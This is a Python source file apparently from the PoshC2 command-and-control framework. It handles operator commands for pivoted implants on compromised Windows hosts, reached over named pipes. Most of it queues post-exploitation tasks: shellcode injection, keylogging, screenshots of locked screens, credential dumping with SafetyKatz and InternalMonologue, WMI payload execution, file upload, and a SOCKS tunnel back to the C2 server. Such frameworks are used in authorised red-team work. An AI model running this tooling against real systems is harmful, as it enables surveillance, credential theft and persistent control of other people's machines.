import base64, re, traceback, os, string, sys
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style

from poshc2.client.Alias import cs_alias, cs_replace
from poshc2.Colours import Colours
from poshc2.Utils import validate_sleep_time, argp, load_file, gen_key
from poshc2.server.AutoLoads import check_module_loaded, run_autoloads_sharp
from poshc2.client.Help import sharp_help
from poshc2.server.Config import PoshInstallDirectory, PoshProjectDirectory, SocksHost, PayloadsDirectory
from poshc2.server.Config import PBindPipeName, PBindSecret
from poshc2.server.Core import print_bad
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
from poshc2.server.PowerStatus import getpowerstatus
from poshc2.server.database.DB import new_task, unhide_implant, kill_implant, get_implantdetails, get_sharpurls, get_baseenckey
from poshc2.server.database.DB import select_item, new_c2_message, get_powerstatusbyrandomuri, update_label, get_randomuri


def handle_pbind_pivot_command(command, user, randomuri, implant_id):

    # convert randomuri to parent randomuri
    oldrandomuri = randomuri
    p = get_implantdetails(randomuri)
    newimplant_id = re.search(r'(?<=\s)\S*', p.Label).group()
    if newimplant_id is not None:
        randomuri = get_randomuri(newimplant_id)
    # alias mapping
    for alias in cs_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    # alias replace
    for alias in cs_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    original_command = command
    command = command.strip()
    
    run_autoloads_sharp(command, randomuri, user, loadmodule_command="pbind-pivot-loadmodule")

    if command.startswith("searchhistory"):
        searchterm = (command).replace("searchhistory ", "")
        with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
            for line in hisfile:
                if searchterm in line.lower():
                    print(Colours.GREEN + line.replace("+",""))

    elif command.startswith("searchhelp"):
        searchterm = (command).replace("searchhelp ", "")
        helpful = sharp_help.split('\n')
        for line in helpful:
            if searchterm in line.lower():
                print(Colours.GREEN + line)

    elif command.startswith("upload-file"):
        source = ""
        destination = ""
        if command == "upload-file":
            style = Style.from_dict({
                '': '#80d130',
            })
            session = PromptSession(history=FileHistory('%s/.upload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
            try:
                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
                source = PayloadsDirectory + source
            except KeyboardInterrupt:
                return
            while not os.path.isfile(source):
                print("File does not exist: %s" % source)
                source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
                source = PayloadsDirectory + source
            destination = session.prompt("Location to upload to: ")
        else:
            args = argp(command)
            source = args.source
            destination = args.destination
        try:
            destination = destination.replace("\\", "\\\\")
            print("")
            print("Uploading %s to %s" % (source, destination))
            uploadcommand = f"upload-file {source} {destination}"
            new_task(f"pbind-pivot-command {uploadcommand}", user, randomuri)
        except Exception as e:
            print_bad("Error with source file: %s" % e)
            traceback.print_exc()

    elif command.startswith("unhide-implant"):
        unhide_implant(oldrandomuri)

    elif command.startswith("hide-implant"):
        kill_implant(oldrandomuri)

    elif command.startswith("inject-shellcode"):
        params = re.compile("inject-shellcode", re.IGNORECASE)
        params = params.sub("", command)
        style = Style.from_dict({
            '': '#80d130',
        })
        session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
            path = PayloadsDirectory + path
        except KeyboardInterrupt:
            return
        try:
            shellcodefile = load_file(path)
            if shellcodefile is not None:
                new_task("pbind-pivot-command run-exe Core.Program Core Inject-Shellcode %s%s #%s" % (base64.b64encode(shellcodefile).decode("utf-8"), params, os.path.basename(path)), user, randomuri)
        except Exception as e:
            print("Error loading file: %s" % e)

    elif command.startswith("migrate"):
        params = re.compile("migrate", re.IGNORECASE)
        params = params.sub("", command)
        migrate(randomuri, user, params)

    elif command == "kill-implant" or command == "exit":
        impid = get_implantdetails(randomuri)
        ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
        if ri.lower() == "n":
            print("Implant not terminated")
        if ri == "" or ri.lower() == "y":
            new_task("pbind-pivot-kill", user, randomuri)
            kill_implant(oldrandomuri)

    elif command == "sharpsocks":
        from random import choice
        allchar = string.ascii_letters
        channel = "".join(choice(allchar) for x in range(25))
        sharpkey = gen_key().decode("utf-8")
        sharpurls = get_sharpurls()
        sharpurls = sharpurls.split(",")
        sharpurl = select_item("HostnameIP", "C2Server")
        print("\nIf using Docker, change the SocksHost to be the IP of the PoshC2 Server not 127.0.0.1:49031")
        print("sharpsocks -t latest -s \"-c=%s -k=%s --verbose -l=http://*:%s\"\r" % (channel, sharpkey, SocksHost.split(":")[2]) + Colours.GREEN)
        print("\nElse\n")
        print("sharpsocks -c=%s -k=%s --verbose -l=%s\r\n" % (channel, sharpkey, SocksHost) + Colours.GREEN) 
        ri = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")
        if ri.lower() == "n":
            print("")
        if ri == "":
            new_task("pbind-pivot-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)
        if ri.lower() == "y":
            new_task("pbind-pivot-command run-exe SharpSocksImplantTestApp.Program SharpSocks -s %s -c %s -k %s -url1 %s -url2 %s -b 2000 --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken" % (sharpurl, channel, sharpkey, sharpurls[0].replace("\"", ""), sharpurls[1].replace("\"", "")), user, randomuri)

    elif (command.startswith("stop-keystrokes")):
        new_task("pbind-pivot-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
        update_label("", randomuri)

    elif (command.startswith("start-keystrokes")):
        check_module_loaded("Logger.exe", oldrandomuri, user)
        new_task("pbind-pivot-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)
        update_label("KEYLOG", randomuri)

    elif (command.startswith("get-keystrokes")):
        new_task("pbind-pivot-command run-exe Logger.KeyStrokesClass Logger %s" % command, user, randomuri)

    elif (command.startswith("get-screenshotmulti")):
        pwrStatus = get_powerstatusbyrandomuri(randomuri)
        if (pwrStatus is not None and pwrStatus[7]):
            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
            if ri.lower() == "n" or ri.lower() == "":
                return
        new_task(f"pbind-pivot-command {command}", user, randomuri)
        update_label("SCREENSHOT", randomuri)

    elif (command.startswith("get-screenshot")):
        pwrStatus = get_powerstatusbyrandomuri(randomuri)
        if (pwrStatus is not None and pwrStatus[7]):
            ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
            if ri.lower() == "n" or ri.lower() == "":
                return
        new_task(f"pbind-pivot-command {command}", user, randomuri)

    elif (command == "get-powerstatus"):
        getpowerstatus(randomuri)
        new_task("pbind-pivot-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)

    elif (command == "getpowerstatus"):
        getpowerstatus(randomuri)
        new_task("pbind-pivot-command run-dll PwrStatusTracker.PwrFrm PwrStatusTracker GetPowerStatusResult ", user, randomuri)

    elif (command.startswith("stop-powerstatus")):
        new_task(f"pbind-pivot-command {command}", user, randomuri)
        update_label("", randomuri)

    elif (command.startswith("stoppowerstatus")):
        new_task(f"pbind-pivot-command {command}", user, randomuri)
        update_label("", randomuri)

    elif (command.startswith("pslo")):
        new_task(f"pbind-{command}", user, randomuri)

    elif (command.startswith("run-exe SharpWMI.Program")) and "execute" in command and "payload" not in command:
        style = Style.from_dict({'': '#80d130'})
        session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
        try:
            path = session.prompt("Location of base64 vbs/js file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
            path = PayloadsDirectory + path
        except KeyboardInterrupt:
            return
        if os.path.isfile(path):
            with open(path, "r") as p:
                payload = p.read()
            new_task("pbind-pivot-command %s payload=%s" % (command,payload), user, randomuri)
        else:
            print_bad("Could not find file")

    elif (command.startswith("get-hash")):
        check_module_loaded("InternalMonologue.exe", oldrandomuri, user)
        new_task("pbind-pivot-command run-exe InternalMonologue.Program InternalMonologue", user, randomuri)

    elif (command.startswith("safetykatz")):
        new_task("pbind-pivot-command run-exe SafetyKatz.Program %s" % command, user, randomuri)

    elif command.startswith("loadmoduleforce"):
        params = re.compile("loadmoduleforce ", re.IGNORECASE)
        params = params.sub("", command)
        new_task("pbind-pivot-loadmodule %s" % params, user, randomuri)

    elif command.startswith("loadmodule"):
        params = re.compile("loadmodule ", re.IGNORECASE)
        params = params.sub("", command)
        new_task("pbind-pivot-loadmodule %s" % params, user, randomuri)

    elif command.startswith("listmodules"):
        modules = os.listdir("%s/Modules/" % PoshInstallDirectory)
        modules = sorted(modules, key=lambda s: s.lower())
        print("")
        print("[+] Available modules:")
        print("")
        for mod in modules:
            if (".exe" in mod) or (".dll" in mod):
                print(mod)

    elif command.startswith("modulesloaded"):
        ml = get_implantdetails(oldrandomuri)
        print(ml.ModsLoaded)
        new_task("pbind-pivot-command listmodules", user, randomuri)

    elif command == "help" or command == "?":
        print(sharp_help)

    elif command.startswith("pbind-connect"):
        do_pbind_start(user, command, randomuri)

    elif command.startswith("beacon") or command.startswith("set-beacon") or command.startswith("setbeacon"):
        new_sleep = command.replace('set-beacon ', '')
        new_sleep = new_sleep.replace('setbeacon ', '')
        new_sleep = new_sleep.replace('beacon ', '').strip()
        if not validate_sleep_time(new_sleep):
            print(Colours.RED)
            print("Invalid sleep command, please specify a time such as 50s, 10m or 1h")
            print(Colours.GREEN)
        else:
            new_task(f"pbind-pivot-command {command}", user, randomuri)

    else:
        if command:
            new_task(f"pbind-pivot-command {original_command}", user, randomuri)
        return


def do_pbind_start(user, command, randomuri):
    key = get_baseenckey()
    if len(command.split()) == 2:  # 'pbind-connect <hostname>' is two args
        command = f"{command} {PBindPipeName} {PBindSecret} {key}"
    elif len(command.split()) == 4:  # if the pipe name and secret are already present just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'pbind_connect <hostname>' or 'pbind_connect <hostname> <pipename> <secret>'")
        return
    
    if command.startswith("pbind-pivot-command "):
        command = command.replace("pbind-pivot-command ", "pbind-pivot-command run-exe PBind PBind ")
    elif command.startswith("pbind-connect"):
        command = command.replace("pbind-connect ", "pbind-pivot-command run-exe PBind PBind start ")
    elif command.startswith("pbind-kill"):
        command = command.replace("pbind-kill", "pbind-pivot-command run-exe PBind PBind kill-implant")

    new_task(command, user, randomuri)

def migrate(randomuri, user, params=""):
    print("Do not use migrate when in a pbind implant - use Inject-Shellcode")